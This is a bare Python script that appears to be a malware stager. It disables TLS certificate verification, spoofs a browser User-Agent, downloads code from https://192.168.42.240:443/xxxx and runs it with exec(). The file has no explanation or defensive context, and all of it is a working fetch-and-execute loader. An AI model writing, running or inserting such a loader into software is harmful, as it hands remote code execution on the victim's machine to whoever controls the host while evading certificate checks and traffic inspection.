import sys

vi = sys.version_info
ul = __import__({2:'urllib2', 3:'urllib.request'}[vi[0]], fromlist = ['build_opener', 'HTTPSHandler'])
hs = []

if (vi[0] == 2 and vi>=(2, 7, 9)) or vi >= (3, 4, 3):
	import ssl
	sc = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
	sc.check_hostname = False
	sc.verify_mode    = ssl.CERT_NONE
	hs.append(ul.HTTPSHandler(0, sc))

o = ul.build_opener(*hs)
o.addheaders=[('User-Agent', 'Mozilla/5.0')]
exec(o.open('https://192.168.42.240:443/xxxx').read())
